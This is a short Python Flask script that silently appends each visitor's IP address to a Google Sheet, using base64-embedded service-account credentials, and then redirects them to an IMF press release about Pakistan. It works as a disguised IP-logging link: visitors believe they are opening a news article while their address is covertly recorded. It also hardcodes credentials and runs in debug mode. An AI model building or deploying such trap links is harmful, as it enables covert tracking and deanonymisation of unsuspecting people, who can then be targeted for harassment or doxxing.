import base64
import json
import tempfile
from flask import Flask, request, redirect
import gspread
from oauth2client.service_account import ServiceAccountCredentials

# Single-line base64 encoded credentials
ENCODED_CREDS = "eyJ0eXBlIjogInNlcnZpY2VfYWNjb3VudCIsICJwcm9qZWN0X2lkIjogImJvbGQt..."

# Decode and write to a temp file
with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.json') as f:
    f.write(base64.b64decode(ENCODED_CREDS).decode('utf-8'))
    creds_file_path = f.name

# Setup Flask
app = Flask(__name__)

@app.route('/')
def home():
    ip_address = request.remote_addr

    # Connect to Google Sheets
    scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
    creds = ServiceAccountCredentials.from_json_keyfile_name(creds_file_path, scope)
    client = gspread.authorize(creds)

    sheet = client.open_by_url("https://docs.google.com/spreadsheets/d/11mcR0n9IkpHvqF5TWFC21XbYeietjNuZCIJ3GAZGiBI/edit").sheet1
    sheet.append_row([ip_address])

    return redirect("https://www.imf.org/en/News/Articles/2025/05/09/pr-25137-pakistan-imf-completes-1st-rev-of-eff-arrang-and-approves-req-for-arrang-under-rsf")

if __name__ == '__main__':
    app.run(debug=True)
